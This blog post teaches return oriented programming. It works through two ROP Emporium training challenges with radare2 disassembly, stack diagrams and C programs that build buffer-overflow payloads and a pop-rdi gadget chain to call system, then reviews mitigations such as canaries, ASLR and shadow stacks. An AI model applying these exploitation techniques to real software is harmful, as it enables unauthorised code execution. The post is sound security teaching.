---
title: "Return Oriented Programming"
date: 2019-06-15T21:40:00+02:00
---
As a C++ programmer I am well aware of memory errors such as buffer overflows and dangling pointers.
There are a lot of good debugging tools available like Memcheck in Valgrind and Address Sanitizer in GCC and Clang which help identifying the root cause leading to the memory corruption.
But memory errors are not just bugs resulting in crashes or incorrect program behavior.
They are potentially severe security issues.
To better understand the risks involved, let us take a look at some basic concepts of exploitation, particularly at return oriented programming (ROP).



# Function Calls in x86 Assembly

Before we get our hands dirty, we will briefly look at x86 assembly.
Don't panic!
We will only look at four instructions which are relevant for function calls and stack manipulation.
That's all we will need for the moment.

Function support is provided by two instructions at the assembly level: `call` and `ret`.
The `call` instruction takes the address of a function as an operand, either as a fixed address as part of the instruction encoding (immediate) or as a register holding the address (indirect call).
The latter one is used, among others, for virtual function calls as the address of the callee is not known at compile-time.
There are two operations `call` does.

1. It pushes the address of the following instruction on the stack.
   This will be the location where the program continues execution after the function call (return address).
2. It jumps to the address provided by the operand which transfers control flow to the callee.

Notice that `call` does not handle any function parameters.
They are passed in registers, and on the stack if a function has a lot of parameters.
The calling convention of the operating system specifies which registers have to be used by a conforming compiler.
Wikipedia has a nice [overview](https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions) of the various calling conventions.
We will focus on x86-64 Linux.
There, the first six parameters are passed in `rdi`, `rsi`, `rdx`, `rcx`, `r8` and `r9`.
Any additional parameter is passed on the stack.
The callee assumes the caller adheres to the calling convention and uses the registers representing the parameters accordingly.

The `ret` instruction has to jump back to wherever the function call originated from.
That is where the return address comes into play.
`ret` pops the address from the top of the stack where the previous `call` left it and transfers control flow back to the caller.
How the return value is transferred to the caller is again specified by the calling convention.
It is usually in the register `rax`.
The important thing to note here is that `ret` always gets the address to jump to from the top of the stack.

There are two more important instructions to manipulate the stack: `push` and `pop`.
`push` stores the value of its operand on the stack and grows the stack accordingly.
`pop` does the opposite.
It loads the value from the top of the stack into the register provided as operand and shrinks the stack.
These two instructions work in the same way as you would expect from push and pop operations on a stack data structure.

Now that we know some basic x86 assembly instructions, let's look at the first two challenges provided by
[ROP Emporium](https://ropemporium.com/)
which is a very nice website to learn the basics of return oriented programming.
__The following sections will hold your hand all the way through the first two challenges.
If you want to try them without spoilers then do so now.__



# Redirecting Control Flow


The first challenge is called
[ret2Win](https://ropemporium.com/challenge/ret2win.html).
The description of the challenge already gives away what we have to do: overwrite the return address on the stack.
Remember, the `ret` instruction is data driven.
Whatever the address on top of the stack is, `ret` will jump to it.
If an attacker can overwrite this memory location, he can redirect control flow to an address of his liking.
And today, we are playing attacker.

But first, let's step back a little and let us analyze the executable we got.
We will focus on the 64-bit version and mostly use
[Radare2 (r2)](https://radare.org/)
to analyze it.
`r2` is a very powerful reverse engineering tool.
Hence, it is quite complex.
We will take it step by step.


We load the program into `r2` and get greeted by a fortune and a command prompt.
The first useful command is `i` which extracts general information from the opened file.

{{% term "ret2win-i" %}}
{{< todo >}}
$ r2 ./ret2win
 -- Place a cat on your keyboard while running r2, you'll not believe what will happen next
[0x00400650]> i
fd       3
file     ./ret2win
size     0x2360
humansz  8.8K
mode     r-x
format   elf64
iorw     false
blksz    0x0
block    0x100
type     EXEC (Executable file)
arch     x86
baddr    0x400000
binsz    7071
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
{{< / todo >}}

Commands in `r2` are categorized and structured in a command tree.
Short sequences of characters are used to navigate the tree, each character representing an option we picked.
For example, to get more detailed information about the executable like the list of symbols, we use the command `is`, extending the command for general information `i`.
You can get a list of available options by adding a question mark at the end, e.g., `i?` or just `?` to get the top-level commands and other helpful explanations.

The list of symbols might be quite long.
We can filter the output of a command with the tilde `~` operator which works like a built-in `grep`.
Filtering for symbols belonging to functions:

{{% term "ret2win-funcs" %}}
{{< todo >}}
```
[0x00400650]> is~FUNC
030 0x00000680 0x00400680  LOCAL   FUNC    0 deregister_tm_clones
031 0x000006c0 0x004006c0  LOCAL   FUNC    0 register_tm_clones
032 0x00000700 0x00400700  LOCAL   FUNC    0 __do_global_dtors_aux
035 0x00000720 0x00400720  LOCAL   FUNC    0 frame_dummy
038 0x000007b5 0x004007b5  LOCAL   FUNC   92 pwnme
039 0x00000811 0x00400811  LOCAL   FUNC   32 ret2win
049 0x000008b0 0x004008b0 GLOBAL   FUNC    2 __libc_csu_fini
056 0x000008b4 0x004008b4 GLOBAL   FUNC    0 _fini
066 0x00000840 0x00400840 GLOBAL   FUNC  101 __libc_csu_init
068 0x00000650 0x00400650 GLOBAL   FUNC   42 _start
070 0x00000746 0x00400746 GLOBAL   FUNC  111 main
075 0x000005a0 0x004005a0 GLOBAL   FUNC    0 _init
001 0x000005d0 0x004005d0 GLOBAL   FUNC   16 imp.puts
002 0x000005e0 0x004005e0 GLOBAL   FUNC   16 imp.system
003 0x000005f0 0x004005f0 GLOBAL   FUNC   16 imp.printf
004 0x00000600 0x00400600 GLOBAL   FUNC   16 imp.memset
005 0x00000610 0x00400610 GLOBAL   FUNC   16 imp.__libc_start_main
006 0x00000620 0x00400620 GLOBAL   FUNC   16 imp.fgets
008 0x00000630 0x00400630 GLOBAL   FUNC   16 imp.setvbuf
```
{{< / todo >}}

We can also chain filters:
{{% term "ret2win-funcslocal" %}}
{{< todo >}}
```
[0x00400650]> is~FUNC~LOCAL
030 0x00000680 0x00400680  LOCAL   FUNC    0 deregister_tm_clones
031 0x000006c0 0x004006c0  LOCAL   FUNC    0 register_tm_clones
032 0x00000700 0x00400700  LOCAL   FUNC    0 __do_global_dtors_aux
035 0x00000720 0x00400720  LOCAL   FUNC    0 frame_dummy
038 0x000007b5 0x004007b5  LOCAL   FUNC   92 pwnme
039 0x00000811 0x00400811  LOCAL   FUNC   32 ret2win
```
{{< / todo >}}


Two functions stand out because of their suspicious names: _pwnme_ and _ret2win_.
Let us have a look at _pwnme_ first.
We seek to the function with `s 0x004007b5`.
Next, we analyze the function with `af` which among others determines the function boundaries.
From the symbol table we only got the entry point of the function.
With the boundaries analyzed, we can print the disassembly of the function with `pdf`.
The last two commands work implicitly with the current position.

{{% term "ret2win-pwnme" %}}
{{< todo >}}
```
[0x00400650]> s 0x004007b5
[0x004007b5]> af
[0x004007b5]> pdf
/ (fcn) sym.pwnme 92
|   sym.pwnme ();
|           ; var int32_t var_20h @ rbp-0x20
|           0x004007b5      55             push rbp
|           0x004007b6      4889e5         mov rbp, rsp
|           0x004007b9      4883ec20       sub rsp, 0x20
|           0x004007bd      488d45e0       lea rax, [var_20h]
|           0x004007c1      ba20000000     mov edx, 0x20               ; 32
|           0x004007c6      be00000000     mov esi, 0
|           0x004007cb      4889c7         mov rdi, rax
|           0x004007ce      e82dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x004007d3      bff8084000     mov edi, str.For_my_first_trick__I_will_attempt_to_fit_50_bytes_of_user_input_into_32_bytes_of_stack_buffer___What_could_possibly_go_wrong ; 0x4008f8 ; "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?"
|           0x004007d8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007dd      bf78094000     mov edi, str.You_there_madam__may_I_have_your_input_please__And_don_t_worry_about_null_bytes__we_re_using_fgets ; 0x400978 ; "You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"
|           0x004007e2      e8e9fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007e7      bfdd094000     mov edi, 0x4009dd
|           0x004007ec      b800000000     mov eax, 0
|           0x004007f1      e8fafdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x004007f6      488b15730820.  mov rdx, qword [obj.stdin]; MOV rdx = [0x601070] = 0x0 rsp ; obj.stdin__GLIBC_2.2.5 ; [0x601070:8]=0
|           0x004007fd      488d45e0       lea rax, [var_20h]
|           0x00400801      be32000000     mov esi, 0x32               ; '2' ; 50
|           0x00400806      4889c7         mov rdi, rax
|           0x00400809      e812feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x0040080e      90             nop
|           0x0040080f      c9             leave
\           0x00400810      c3             ret
```
{{< / todo >}}


Well, now we just have to understand the assembly.
The function consists mostly of function calls to _memset_, _puts_, _printf_ and _fgets_.
There are no complex calculations happening.
With the calling convention in mind, we can decompile it by hand to the following C function.

{{< highlight C >}}
void pwnme(){
	char buf[32];
	memset(buf, 0, 32);
	puts("For my first trick, I will attempt to fit 50 bytes of user input "
	     "into 32 bytes of stack buffer;\nWhat could possibly go wrong?");
	puts("You there madam, may I have your input please? And don't worry "
	     "about null bytes, we're using fgets!\n");
	printf(">");
	fgets(buf, 50, stdin);
}
{{< / highlight >}}

The programming bug is quite obvious.
The function stores with _fgets_ up to 50 bytes of data from stdin into a stack buffer which is only 32 bytes large.
On x86 the stack grows downwards which means that by writing past the end of the buffer we overwrite previous elements deeper on the stack, like the return address which was pushed on the stack when calling the function.

So, we found an exploitable memory error.
Now, what do we do with it?
The task was to get the content of the file _flag.txt_.
Let us look at the other suspiciously named function _ret2win_ using the same commands we just learned.

{{% term "ret2win-ret2win" %}}
{{< todo >}}
```
[0x004007b5]> s 0x00400811
[0x00400811]> af
[0x00400811]> pdf
/ (fcn) sym.ret2win 32
|   sym.ret2win ();
|           0x00400811      55             push rbp
|           0x00400812      4889e5         mov rbp, rsp
|           0x00400815      bfe0094000     mov edi, str.Thank_you__Here_s_your_flag: ; 0x4009e0 ; "Thank you! Here's your flag:"
|           0x0040081a      b800000000     mov eax, 0
|           0x0040081f      e8ccfdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400824      bffd094000     mov edi, str.bin_cat_flag.txt ; 0x4009fd ; "/bin/cat flag.txt"
|           0x00400829      e8b2fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0040082e      90             nop
|           0x0040082f      5d             pop rbp
\           0x00400830      c3             ret
```
{{< / todo >}}

It is not hard to see that this function fulfills the task.
It executes the command string "/bin/cat flag.txt" through the function call to _system_.
All we have to do is call this function.
So then, let's plan the attack!

We have to understand where the return address is located relative to the stack buffer we can fill with data.
Let us have a look at the start of the function _pwnme_ again, just the first three instructions.

{{% term "ret2win-pwnme-head" %}}
{{< todo >}}
```
|           0x004007b5      55             push rbp
|           0x004007b6      4889e5         mov rbp, rsp
|           0x004007b9      4883ec20       sub rsp, 0x20
```
{{< / todo >}}

`push rbp` saves the base pointer on the stack.
It is later used by the `leave` instruction at the end of the function to unwind the stack frame.
`sub rsp, 0x20` grows the stack downwards by 32 bytes, basically reserving space for our buffer on the stack.
That's all it takes to allocate memory on the stack.
There are no further instructions manipulating the stack until we reach the exploitable call to _fgets_.
Hence, we end up with the following stack layout.


<svg version="1.1" width="320" height="110" xmlns="http://www.w3.org/2000/svg">
<g stroke="black" fill="none" stroke-width="2">
<path d="M1 30 h300 v30 h-300 Z m200 0 v30 m50 0 v-30 m50 0 h20 m0 30 h-20"/>
<path d="M1 65 c0 20,120 0,125 20 c5 -20,125 0,125 -20" stroke="red"/>
<path d="M273 83 v-15 m4 0 v15 m5 -10 l-7 -7 l-7 7" stroke="red"/>
</g>
<g text-anchor="middle">
<text x="5" y="20">0</text>
<text x="50" y="20">8</text>
<text x="100" y="20">16</text>
<text x="150" y="20">24</text>
<text x="200" y="20">32</text>
<text x="250" y="20">40</text>
<text x="300" y="20">48</text>
<text x="100" y="50">buffer</text>
<text x="225" y="50">rbp</text>
<text x="275" y="50">reta</text>
<text x="312" y="50">...</text>
<text x="125" y="100">garbage</text>
<text x="275" y="100">0x400811</text>
</g>
</svg>


That means we need to fill up the buffer with 32 bytes of garbage, write additionally 8 bytes for `rbp` and then, finally, overwrite the return address with the address of _ret2win_ `0x00400811`.
We end up with 48 bytes of input data we have to pipe into the challenge program.
It does not matter how you create the input file.
You could just use a hex editor and type it in, or write a little program to create the file.
Here's a C program which does that.

{{< highlight C >}}
#include <stdio.h>
#include <stdint.h>

int main(){
	FILE *fd = fopen("data", "wb");

	// useless content of the stack buffer, 32 bytes large
	for(int i=0; i<32; ++i){
		fputc(0xAA, fd);
	}
	// useless 8 bytes to overwrite rbp
	uint64_t rbp = 0xCAFEBABE;
	fwrite(&rbp, sizeof(rbp), 1, fd);
	// overwrite return address with address of ret2win()
	uint64_t ret2win = 0x00400811;
	fwrite(&ret2win, sizeof(ret2win), 1, fd);

	fclose(fd);
	return 0;
}
{{< / highlight >}}

Let's see if it works.

```
$ ./ret2win <data
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
```

Yep, it does, and it crashes the program.
We corrupted the stack which leads to a segfault.
When the function _ret2win_ finishes execution, it tries to return to its caller with the `ret` instruction.
As we did not use `call` to enter the function, there is no valid return address on the stack.
It will interpret whatever is on top of the stack as return address and that's just asking for trouble.
It does not really concern us.
We got our flag and solved the first challenge.


# Chaining Gadgets

The first challenge was just a warm-up, teaching you how to redirect control flow by overwriting the return address of a function.
The [second challenge 'split'](https://ropemporium.com/challenge/split.html)
teaches us more concepts of return oriented programming, particularly the usage of gadgets and how to chain them together to perform arbitrary operations.

Let us start by analyzing the executable file we got.
First, we extract the list of functions residing in the binary.

{{% term "split-funcs" %}}
{{< todo >}}
```
[0x00400650]> is~FUNC~LOCAL
030 0x00000680 0x00400680  LOCAL   FUNC    0 deregister_tm_clones
031 0x000006c0 0x004006c0  LOCAL   FUNC    0 register_tm_clones
032 0x00000700 0x00400700  LOCAL   FUNC    0 __do_global_dtors_aux
035 0x00000720 0x00400720  LOCAL   FUNC    0 frame_dummy
038 0x000007b5 0x004007b5  LOCAL   FUNC   82 pwnme
039 0x00000807 0x00400807  LOCAL   FUNC   17 usefulFunction
```
{{< / todo >}}

The function _pwnme_ sounds familiar.
If you check out the disassembly, you will notice that it is pretty much unchanged.
The size parameter to _fgets_ is larger which allows us to write more data to the stack.
That will make our life easier.

The second interesting function is suspiciously named _usefulFunction_.
What is so useful about it?

{{% term "split-usefulFunction" %}}
{{< todo >}}
```
/ (fcn) sym.usefulFunction 17
|   sym.usefulFunction ();
|           0x00400807      55             push rbp
|           0x00400808      4889e5         mov rbp, rsp
|           0x0040080b      bfff084000     mov edi, str.bin_ls         ; 0x4008ff ; "/bin/ls"
|           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
|           0x00400815      90             nop
|           0x00400816      5d             pop rbp
\           0x00400817      c3             ret
```
{{< / todo >}}

Mhmm, there is this call to _system_ again...
But this time it is just executing "/bin/ls".
Too bad. Could have been so easy.

Well, let's dig a little deeper.
_system_ takes a string as the only parameter.
What are the strings stored in the executable?
The command `iz` searches for all strings in the data section where constants like string literals are usually stored.

{{% term "split-iz" %}}
{{< todo >}}
```
[0x00400807]> iz
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x000008a8 0x004008a8  21  22 (.rodata) ascii split by ROP Emporium
001 0x000008be 0x004008be   7   8 (.rodata) ascii 64bits\n
002 0x000008c6 0x004008c6   8   9 (.rodata) ascii \nExiting
003 0x000008d0 0x004008d0  43  44 (.rodata) ascii Contriving a reason to ask user for data...
004 0x000008ff 0x004008ff   7   8 (.rodata) ascii /bin/ls
000 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt
```
{{< / todo >}}

Talk about lucky!
Our favorite string "/bin/cat flag.txt" is still in the executable.
We could have found it as well by studying the symbol table more carefully (`is~useful`).
Now we need to call _system_ with this string as function parameter, but there is no such control flow anywhere in the whole executable.
We have to create one by abusing the code which is available.
This is what return oriented programming is all about.

More than 15 years ago life for an attacker was easy.
We could write our own code we like to execute at the beginning of the stack buffer and overwrite the return address with the address of the start of the buffer to redirect control flow there.
Boom! Arbitrary code execution.

That is not possible anymore.
Since then the memory protection policy "W ^ X" got introduced in every major general-purpose operating system.
A memory page can be writable or executable, but not both.
The policy is not strictly followed everywhere but for the stack it is.
The stack memory is obviously writable to store local variables and return addresses, but it does not need to be executable as it just contains data.
We can check with `i~nx` if the stack is non-executable.
On a modern Linux system, it should be.

The memory page containing the program instructions is executable but not writable, which prevents us from manipulating the program code.
We can still redirect control flow anywhere we want and therefore execute any code in the program and its library dependencies.
If we jump just a few instructions before a `ret` instruction, just these few instructions will be executed before we can jump elsewhere with `ret` reading the next address from the stack we control.
That is called a ROP gadget.
Combining multiple gadgets is called a ROP chain.

We need to replace the first parameter to a function call.
The first parameter is passed in the register `rdi` according to the calling convention.
We must load the address of the string "/bin/cat flag.txt" `0x00601060` into this register, so that _system_ will use it instead of "/bin/ls".
We control the stack memory.
So, let's write the address on the stack and use the `pop` instruction to get it into the register `rdi`.
We can search for ROP gadgets with the `/R` command.

{{% term "split-gadget" %}}
{{< todo >}}
```
[0x00400807]> /R pop rdi
  0x00400883                 5f  pop rdi
  0x00400884                 c3  ret
```
{{< / todo >}}

That is exactly what we were looking for.
Let's put it all together.


<svg version="1.1" width="420" height="120" xmlns="http://www.w3.org/2000/svg">
<g stroke="black" fill="none" stroke-width="2">
<path d="M1 30 h400 v30 h-400 Z m200 0 v30 m50 0 v-30 m50 0 v30 m50 0 v-30 m50 0 h20 m0 30 h-20"/>
<path d="M1 65 c0 20,120 0,125 20 c5 -20,125 0,125 -20" stroke="red"/>
<path d="M273 83 v-15 m4 0 v15 m5 -10 l-7 -7 l-7 7" stroke="red"/>
<path d="M323 103 v-35 m4 0 v35 m5 -30 l-7 -7 l-7 7" stroke="red"/>
<path d="M373 83 v-15 m4 0 v15 m5 -10 l-7 -7 l-7 7" stroke="red"/>
</g>
<g text-anchor="middle">
<text x="5" y="20">0</text>
<text x="50" y="20">8</text>
<text x="100" y="20">16</text>
<text x="150" y="20">24</text>
<text x="200" y="20">32</text>
<text x="250" y="20">40</text>
<text x="300" y="20">48</text>
<text x="350" y="20">56</text>
<text x="400" y="20">64</text>
<text x="100" y="50">buffer</text>
<text x="225" y="50">rbp</text>
<text x="275" y="50">reta</text>
<text x="325" y="50">(pop)</text>
<text x="375" y="50">(ret)</text>
<text x="412" y="50">...</text>
<text x="125" y="100">garbage</text>
<text x="275" y="100">0x400883</text>
<text x="325" y="120">0x601060</text>
<text x="375" y="100">0x400810</text>
</g>
</svg>


_pwnme_ still has the same vulnerability.
We fill up the stack buffer with 32 bytes of garbage, followed by 8 bytes for the stored `rbp` register.
Next, we overwrite the return address with the address to the ROP gadget at `0x00400883`.
The gadget reads 8 bytes from the stack with `pop rdi` which means we write the address `0x00601060` of the string "/bin/cat flag.txt" next.
The second instruction in the gadget is a `ret` instruction, so we can write the next address to jump to on the stack.
We can jump into _usefulFunction_ at `0x00400810` where the call instruction to _system_ is located.
Alternatively, we can jump directly to _system_ by getting its address with `is~system`.

ROP is all about sequencing precise jumps to execute a few instructions and jump on.
Kind of bunny hopping all over the executable code of a program.
With enough executable code available it is Turing complete, i.e., any possible calculation can be performed.
The C standard library "libc" is big enough and used by a lot of central components of most operating systems.

Here's a C program creating the input file.

{{< highlight C >}}
#include <stdio.h>
#include <stdint.h>

int main(){
	FILE *fd = fopen("data", "wb");

	// useless content of the stack buffer, 32 bytes large
	for(int i=0; i<32; ++i){
		fputc(0xAA, fd);
	}
	// useless 8 bytes to overwrite rbp
	uint64_t rbp = 0xCAFEBABE;
	fwrite(&rbp, sizeof(rbp), 1, fd);

	// gadget: pop rdi; ret
	uint64_t poprdi = 0x00400883;
	fwrite(&poprdi, sizeof(poprdi), 1, fd);

	// string "/bin/cat flag.txt"
	uint64_t flag = 0x00601060;
	fwrite(&flag, sizeof(flag), 1, fd);
	// call system
	uint64_t system = 0x00400810;
	fwrite(&system, sizeof(system), 1, fd);

	fclose(fd);
	return 0;
}
{{< / highlight >}}


```
$ ./split <data
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
```

With the second challenge beaten you can check out the other challenges.
I had a lot of fun piecing the puzzles together and learned a bunch of new things about the low-level execution flow of a program, especially how function calls into a shared library really work.
I encourage you to have a look at the other challenges.


# ROP Mitigations

Now that we understand the basic concept behind ROP, let us briefly look at some mitigation techniques which try to harden software against exploitation with ROP.

A general technique to detect stack buffer overflows and prevent overwriting of return addresses is called stack canaries.
A canary value chosen randomly at program start gets written right on top of return address of a function.
Before the function returns, the canary value is checked to be unchanged.
An attacker trying to overwrite the return address has to overwrite the canary value as well, with the same value which was there before.
Most compilers support some kind of stack protection like this.
The compilation flag in GCC is `-fstack-protector` to protect only "larger" functions which limits the negative performance impact, or `-fstack-protector-all` to protect all functions.
The ROP Emporium challenges have it disabled (`i~canary`).

Another widespread technique is address space layout randomization (ASLR).
The address where each component of a program (executable code and library dependencies) is mapped into the virtual address space of the process is randomly chosen at the program start.
Hence, the attacker does not know the address of a ROP gadget anymore as it changes with each program start.
Program code must be compiled as position-independent code (PIC) to support this randomization.
It was not done for the challenges (`i~pic`).


{{< todo >}}
[Retguard](https://marc.info/?l=openbsd-tech&m=150317547021396&w=2)
as an example for ROP gadget spoilage
{{< / todo >}}


[Intel CET](https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf)
changes how the `call` and `ret` instruction work.
It creates a shadow stack for return addresses.
`call` pushes to both stacks, normal and shadow, and `ret` pops from both and does a comparison before jumping.
The other feature of CET is Indirect Branch Tracking which enforces that every legal target of an indirect call/jump starts with an `endbranch` instruction.
This should limit the number of useful gadgets.

It requires compiler support which landed in GCC 8.
And even more importantly, CPUs supporting this feature.
I am not aware of any CPU being sold today that supports it.
Something to keep in mind for the future, I guess.
In the meantime, one might try Clang's [SafeStack](https://clang.llvm.org/docs/SafeStack.html) which implements a shadow stack as well but works on today's CPUs.


# Conclusion

I hope you found this post informative and have now a better understanding why certain security mitigations exist and work the way they do.
Yes, they have a negative impact on your program performance, but they are essential to make the life hard for an attacker.
So, next time you handle input data coming from some untrusted source be extra careful to check the buffer size correctly.
You know now what otherwise can happen.

Hopefully you also had a little fun playing attacker for once.
I for sure had, but according to my colleagues I might be "special" in that regard.
There has to be something wrong with people looking at (dis)assembly.
Who knows...

I think one can only grow as a programmer when one occasionally lifts the lid and has a look how things are really implemented.
Curiosity is part of my job description as a researcher and leads to deeper understanding which I am happy to share with you.
Until next time.
